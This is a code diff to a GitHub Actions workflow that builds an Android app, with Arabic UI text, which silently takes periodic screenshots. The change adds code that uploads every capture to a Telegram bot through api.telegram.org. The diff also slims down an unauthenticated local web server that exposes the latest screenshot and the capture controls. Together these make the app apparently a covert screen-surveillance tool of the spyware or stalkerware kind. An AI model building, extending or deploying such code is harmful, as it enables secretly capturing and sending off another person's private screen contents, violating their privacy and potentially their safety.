@@ -1,4 +1,4 @@
-name: Silent Periodic Screenshot
+name: Silent Periodic Screenshot to Telegram
 
 on:
   push:
@@ -44,8 +44,8 @@ jobs:
                   applicationId "com.lan.screenshare"
                   minSdk 26
                   targetSdk 34
-                  versionCode 9
-                  versionName "3.1-silent-shots"
+                  versionCode 10
+                  versionName "3.2-telegram"
               }
               compileOptions {
                   sourceCompatibility JavaVersion.VERSION_17
@@ -126,15 +126,16 @@ jobs:
           package com.lan.screenshare
 
           import android.app.*
-          import android.app.KeyguardManager
           import android.content.BroadcastReceiver
           import android.content.ComponentName
           import android.content.Context
           import android.content.Intent
           import android.content.IntentFilter
+          import android.content.SharedPreferences
           import android.content.pm.PackageManager
           import android.content.pm.ServiceInfo
           import android.graphics.Bitmap
+          import android.graphics.Color
           import android.graphics.PixelFormat
           import android.hardware.display.DisplayManager
           import android.hardware.display.VirtualDisplay
@@ -144,19 +145,14 @@ jobs:
           import android.net.Uri
           import android.os.*
           import android.provider.Settings
-          import android.widget.Button
-          import android.widget.LinearLayout
-          import android.widget.ScrollView
-          import android.widget.TextView
-          import java.io.BufferedReader
-          import java.io.ByteArrayOutputStream
-          import java.io.File
-          import java.io.InputStreamReader
-          import java.io.OutputStream
+          import android.widget.*
+          import java.io.*
+          import java.net.HttpURLConnection
           import java.net.InetSocketAddress
           import java.net.NetworkInterface
           import java.net.ServerSocket
           import java.net.Socket
+          import java.net.URL
           import java.net.URLDecoder
           import java.net.URLEncoder
           import java.text.SimpleDateFormat
@@ -204,6 +200,32 @@ jobs:
                   }
 
                   layout.addView(statusTxt)
+                  
+                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
+                  
+                  val etToken = EditText(this).apply {
+                      hint = "Telegram Bot Token"
+                      setText(prefs.getString("bot_token", ""))
+                      setTextColor(Color.BLACK)
+                  }
+                  layout.addView(etToken)
+                  
+                  val etChatId = EditText(this).apply {
+                      hint = "Telegram Chat ID"
+                      setText(prefs.getString("chat_id", ""))
+                      setTextColor(Color.BLACK)
+                  }
+                  layout.addView(etChatId)
+
+                  layout.addView(Button(this).apply {
+                      text = "حفظ إعدادات تيليجرام"
+                      setOnClickListener {
+                          prefs.edit().putString("bot_token", etToken.text.toString().trim()).apply()
+                          prefs.edit().putString("chat_id", etChatId.text.toString().trim()).apply()
+                          Toast.makeText(this@MainActivity, "تم الحفظ!", Toast.LENGTH_SHORT).show()
+                          statusTxt.text = buildStatusText()
+                      }
+                  })
 
                   layout.addView(Button(this).apply {
                       text = "1) منح إذن الشاشة (مرة واحدة)"
@@ -219,8 +241,13 @@ jobs:
                       setOnClickListener {
                           thread {
                               val bytes = StreamService.captureNow()
+                              val success = StreamService.sendToTelegramStatic(bytes)
                               runOnUiThread {
-                                  statusTxt.text = if (bytes != null) "✅ تم التقاط ${bytes.size} بايت" else "❌ فشل الالتقاط (تحقق من الإذن)"
+                                  if (bytes != null) {
+                                      statusTxt.text = if(success) "✅ تم التقاط وإرسال ${bytes.size} بايت لتيليجرام" else "⚠️ تم الالتقاط لكن فشل الإرسال لتيليجرام (تأكد من الإعدادات)"
+                                  } else {
+                                      statusTxt.text = "❌ فشل الالتقاط (تحقق من الإذن)"
+                                  }
                               }
                           }
                       }
@@ -286,17 +313,18 @@ jobs:
                   }
                   val diskSize = getDiskUsage()
                   val fileCount = getFileCount()
+                  
+                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
+                  val hasTg = prefs.getString("bot_token", "").isNullOrEmpty().not() && prefs.getString("chat_id", "").isNullOrEmpty().not()
+                  val tgStatus = if (hasTg) "مفعل ✅" else "غير مفعل ❌"
+
                   return "الحالة: $state\n" +
+                         "تيليجرام: $tgStatus\n" +
                          "الفاصل: ${StreamService.captureInterval/1000} ثانية\n" +
-                         "اللقطات المحفوظة: $fileCount\n" +
+                         "اللقطات المحفوظة محلياً: $fileCount\n" +
                          "المساحة المستخدمة: ${diskSize/1024/1024} MB\n\n" +
-                         "التحكم من المتصفح (على نفس شبكة الواي فاي):\n" +
-                         "http://$localIp:8080\n" +
-                         "http://$localIp:8080/latest\n" +
-                         "http://$localIp:8080/now\n" +
-                         "http://$localIp:8080/files\n" +
-                         "http://$localIp:8080/pause\n" +
-                         "http://$localIp:8080/resume\n\n" +
+                         "التحكم من المتصفح (داخل المنزل):\n" +
+                         "http://$localIp:8080\n\n" +
                          "عناوين IP المتاحة:\n" +
                          getAllIps()
               }
@@ -321,13 +349,8 @@ jobs:
                           intf.inetAddresses.toList().forEach { addr ->
                               val host = addr.hostAddress ?: return@forEach
                               if (!addr.isLoopbackAddress && !host.contains(':')) {
-                                  // إعطاء الأولوية لشبكة الواي فاي المحلية
-                                  if (name.startsWith("wlan") || name.startsWith("swlan")) {
-                                      return host
-                                  }
-                                  if (fallback == "127.0.0.1") {
-                                      fallback = host
-                                  }
+                                  if (name.startsWith("wlan") || name.startsWith("swlan")) return host
+                                  if (fallback == "127.0.0.1") fallback = host
                               }
                           }
                       }
@@ -362,6 +385,11 @@ jobs:
 
                   private var instance: StreamService? = null
                   fun captureNow(): ByteArray? = instance?.captureOne()
+                  
+                  fun sendToTelegramStatic(bytes: ByteArray?): Boolean {
+                      if (bytes == null) return false
+                      return instance?.sendToTelegram(bytes) ?: false
+                  }
               }
 
               private var projection: MediaProjection? = null
@@ -478,6 +506,7 @@ jobs:
                                   val bytes = captureOne()
                                   if (bytes != null) {
                                       saveScreenshotToDisk(bytes)
+                                      sendToTelegram(bytes)
                                       synchronized(buffer) {
                                           buffer.addLast(System.currentTimeMillis() to bytes)
                                           while (buffer.size > maxBuffer) buffer.removeFirst()
@@ -488,6 +517,47 @@ jobs:
                           }
                           try { Thread.sleep(captureInterval) } catch (_: Throwable) {}
                       }
+                  }
+              }
+
+              fun sendToTelegram(webpBytes: ByteArray): Boolean {
+                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
+                  val token = prefs.getString("bot_token", "") ?: ""
+                  val chatId = prefs.getString("chat_id", "") ?: ""
+                  if (token.isEmpty() || chatId.isEmpty()) return false
+
+                  return try {
+                      val boundary = "*****" + System.currentTimeMillis() + "*****"
+                      val url = URL("https://api.telegram.org/bot$token/sendPhoto")
+                      val conn = url.openConnection() as HttpURLConnection
+                      conn.requestMethod = "POST"
+                      conn.doOutput = true
+                      conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
+                      conn.connectTimeout = 10000
+                      conn.readTimeout = 10000
+
+                      val outputStream = conn.outputStream
+                      val writer = DataOutputStream(outputStream)
+
+                      writer.writeBytes("--$boundary\r\n")
+                      writer.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
+                      writer.writeBytes("$chatId\r\n")
+
+                      writer.writeBytes("--$boundary\r\n")
+                      writer.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"shot.webp\"\r\n")
+                      writer.writeBytes("Content-Type: image/webp\r\n\r\n")
+                      writer.write(webpBytes)
+                      writer.writeBytes("\r\n")
+
+                      writer.writeBytes("--$boundary--\r\n")
+                      writer.flush()
+                      writer.close()
+
+                      val responseCode = conn.responseCode
+                      conn.disconnect()
+                      responseCode == 200
+                  } catch (_: Exception) {
+                      false
                   }
               }
 
@@ -583,7 +653,6 @@ jobs:
                               totalSize -= f.length()
                               f.delete()
                           }
-                          // حذف المجلدات اليومية الفارغة
                           root.listFiles()?.forEach { d ->
                               if (d.isDirectory && (d.listFiles()?.isEmpty() != false)) d.delete()
                           }
@@ -634,6 +703,7 @@ jobs:
                               val bytes = captureOne()
                               if (bytes == null) { sendText(out, "NO_PERMISSION"); return }
                               saveScreenshotToDisk(bytes)
+                              sendToTelegram(bytes)
                               synchronized(buffer) {
                                   buffer.addLast(System.currentTimeMillis() to bytes)
                                   while (buffer.size > maxBuffer) buffer.removeFirst()
@@ -654,44 +724,6 @@ jobs:
                               if (bytes == null) { sendText(out, "EMPTY"); return }
                               sendImage(out, bytes)
                           }
-                          path.startsWith("/shot") -> {
-                              val i = path.substringAfter("i=", "0").substringBefore("&").toIntOrNull() ?: 0
-                              val item = synchronized(buffer) { buffer.toList().getOrNull(i) }
-                              if (item == null) { sendText(out, "NOT_FOUND"); return }
-                              sendImage(out, item.second)
-                          }
-                          path.startsWith("/file") -> {
-                              val name = URLDecoder.decode(
-                                  path.substringAfter("name=", "").substringBefore("&"),
-                                  "UTF-8"
-                              )
-                              if (name.isEmpty() || name.contains("..") || name.startsWith("/")) {
-                                  sendText(out, "BAD"); return
-                              }
-                              val f = File(File(filesDir, "shots"), name)
-                              if (!f.exists() || !f.isFile) { sendText(out, "NOT_FOUND"); return }
-                              sendImage(out, f.readBytes())
-                          }
-                          path.startsWith("/files") -> {
-                              val root = File(filesDir, "shots")
-                              val files = mutableListOf<Pair<String, File>>()
-                              root.listFiles()?.forEach { d ->
-                                  if (d.isDirectory) {
-                                      d.listFiles()?.forEach { f ->
-                                          if (f.isFile) files.add("${d.name}/${f.name}" to f)
-                                      }
-                                  }
-                              }
-                              val sorted = files.sortedByDescending { it.second.lastModified() }.take(200)
-                              val sb = StringBuilder("[")
-                              sorted.forEachIndexed { i, p ->
-                                  if (i > 0) sb.append(",")
-                                  val ts = p.second.name.removePrefix("shot_").removeSuffix(".webp").toLongOrNull() ?: 0L
-                                  sb.append("{\"name\":\"${p.first}\",\"size\":${p.second.length()},\"ts\":$ts}")
-                              }
-                              sb.append("]")
-                              sendJson(out, sb.toString())
-                          }
                           path.startsWith("/pause") -> {
                               userPaused = true
                               sendText(out, "OK_PAUSED")
@@ -710,75 +742,24 @@ jobs:
                                   sendText(out, "CURRENT_$captureInterval")
                               }
                           }
-                          else -> sendHtml(out, buildHtml())
+                          else -> {
+                              val status = when {
+                                  !isCapturing -> "OFFLINE"
+                                  userPaused -> "PAUSED"
+                                  !isPhoneUsable() -> "WAITING"
+                                  else -> "LIVE (${captureInterval/1000}s)"
+                              }
+                              val html = "<html><body style='margin:0;background:#111;color:#ccc;text-align:center;font-family:sans-serif'>" +
+                                      "<div style='padding:10px'>$status</div>" +
+                                      "<img src='/latest' style='max-width:100%;max-height:90vh'>" +
+                                      "</body></html>"
+                              sendHtml(out, html)
+                          }
                       }
                   } catch (_: Throwable) {
                   } finally {
                       try { client.close() } catch (_: Throwable) {}
                   }
-              }
-
-              private fun buildHtml(): String {
-                  val root = File(filesDir, "shots")
-                  val diskFiles = mutableListOf<Pair<String, Long>>()
-                  root.listFiles()?.forEach { dayDir ->
-                      if (dayDir.isDirectory) {
-                          dayDir.listFiles()?.forEach { f ->
-                              if (f.isFile) {
-                                  val ts = f.name.removePrefix("shot_").removeSuffix(".webp").toLongOrNull() ?: 0L
-                                  diskFiles.add("${dayDir.name}/${f.name}" to ts)
-                              }
-                          }
-                      }
-                  }
-                  val recent = diskFiles.sortedByDescending { it.second }.take(24)
-                  val dfmt = SimpleDateFormat("dd/MM HH:mm", Locale.US)
-
-                  val status = when {
-                      !isCapturing -> "OFFLINE"
-                      userPaused -> "PAUSED (يدوي)"
-                      !isPhoneUsable() -> "WAITING (الهاتف مقفل)"
-                      else -> "LIVE (كل ${captureInterval/1000}s)"
-                  }
-
-                  val totalSize = diskFiles.sumOf {
-                      try { File(File(filesDir, "shots"), it.first).length() } catch (_: Exception) { 0L }
-                  }
-
-                  val items = recent.joinToString("") { (name, ts) ->
-                      val enc = URLEncoder.encode(name, "UTF-8")
-                      "<a class='shot' href='/file?name=$enc' target='_blank'>" +
-                      "<img src='/file?name=$enc' loading='lazy'>" +
-                      "<div class='t'>${dfmt.format(Date(ts))}</div></a>"
-                  }
-
-                  return """
-                  <!DOCTYPE html>
-                  <html dir="rtl"><head>
-                  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-                  <title>Screen</title>
-                  <style>
-                  body{margin:0;background:#0a0a0a;color:#ddd;font-family:sans-serif}
-                  .head{padding:10px;background:#1a1a1a;text-align:center;font-size:13px;position:sticky;top:0;z-index:10}
-                  .head b{color:#4ade80}
-                  .head .pause{color:#fbbf24}
-                  .stats{padding:6px 10px;background:#151515;text-align:center;font-size:11px;color:#888}
-                  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:4px;padding:8px}
-                  .shot{text-decoration:none;color:#aaa;display:block;border:1px solid #222;background:#000}
-                  .shot img{width:100%;display:block;height:auto}
-                  .shot .t{font-size:10px;text-align:center;padding:2px}
-                  </style></head><body>
-                  <div class="head">الحالة: <b>$status</b> &nbsp;|&nbsp; اللقطات: ${diskFiles.size} &nbsp;|&nbsp; ${totalSize/1024/1024} MB &nbsp;|&nbsp; ${SimpleDateFormat("HH:mm", Locale.US).format(Date())}</div>
-                  <div class="stats">
-                  <a href="/now" style="color:#4ade80;text-decoration:none">📷 التقاط الآن</a> &nbsp;|&nbsp;
-                  <a href="/pause" style="color:#fbbf24;text-decoration:none">⏸ إيقاف</a> &nbsp;|&nbsp;
-                  <a href="/resume" style="color:#60a5fa;text-decoration:none">▶ استئناف</a> &nbsp;|&nbsp;
-                  <a href="/files" style="color:#888;text-decoration:none">📁 JSON</a>
-                  </div>
-                  <div class="grid">$items</div>
-                  <script>setTimeout(()=>location.reload(),30000)</script>
-                  </body></html>
-                  """.trimIndent()
               }
 
               private fun sendImage(out: OutputStream, bytes: ByteArray) {
@@ -790,13 +771,6 @@ jobs:
               private fun sendText(out: OutputStream, text: String) {
                   val b = text.toByteArray()
                   out.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: ${b.size}\r\nConnection: close\r\n\r\n".toByteArray())
-                  out.write(b)
-                  out.flush()
-              }
-
-              private fun sendJson(out: OutputStream, json: String) {
-                  val b = json.toByteArray()
-                  out.write("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: ${b.size}\r\nConnection: close\r\n\r\n".toByteArray())
                   out.write(b)
                   out.flush()
               }
@@ -919,5 +893,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: Silent-Periodic-Screenshot-LAN
+          name: Silent-Screenshot-To-Telegram
           path: app/build/outputs/apk/debug/app-debug.apk
